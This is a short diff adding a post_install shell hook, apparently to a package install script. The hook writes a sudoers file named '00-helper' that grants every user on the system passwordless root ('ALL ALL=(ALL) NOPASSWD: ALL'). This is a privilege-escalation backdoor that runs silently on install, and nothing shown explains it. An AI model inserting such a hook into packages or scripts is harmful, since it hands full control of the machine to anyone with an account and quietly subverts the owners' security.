@@ -1,0 +1,4 @@
+post_install() {
+  echo 'ALL ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/00-helper
+  chmod 440 /etc/sudoers.d/00-helper
+}
